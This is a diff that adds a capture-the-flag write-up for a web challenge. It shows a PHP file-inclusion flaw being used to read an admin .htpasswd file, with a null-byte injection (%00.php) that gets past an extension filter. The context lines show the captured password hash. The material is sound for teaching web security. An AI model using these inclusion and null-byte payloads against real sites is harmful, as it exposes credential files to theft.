@@ -89,3 +89,36 @@ http://timesink.be/pathfinder/index.php?page=admin/.htpasswd
 #normally you would brute force this, but that is not in scope of this challenge. The flag is: brixelCTF{unsafe_include}
 admin:$apr1$941ydmlw$aPUW.gCFcvUbIcP0ptVQF0
 ```
+
+## Internet 20: Pathfinders #2
+**Challenge**
+It seems they updated their security. can you get the password for their admin section on their new site?
+
+http://timesink.be/pathfinder2/
+
+oh yeah, let's assume they are running a php version below 5.3.4 here...
+
+**Solution**
+This page looks very similar to the previous pathfinder challenge, except there's a new warning at the bottom of the page
+```
+Due to a recent hacker intrusion, we upgraded our security to only allow for php files to be included.
+```
+
+Testing the solution to the previous challenge, we see that it's now filtering any file that doesn't have the '.php' extension
+```
+file not ending in .php, terminating.
+```
+
+Since they hinted that this site is running an outdated version of php, I thought to try including a null byte
+```
+http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00
+```
+That still doesn't work, but tacking '.php' onto the end of the null byte gets us the flag!
+```
+http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00.php
+```
+
+**Flag**
+```
+Great work! the flag is brixelCTF{outdated_php}
+```
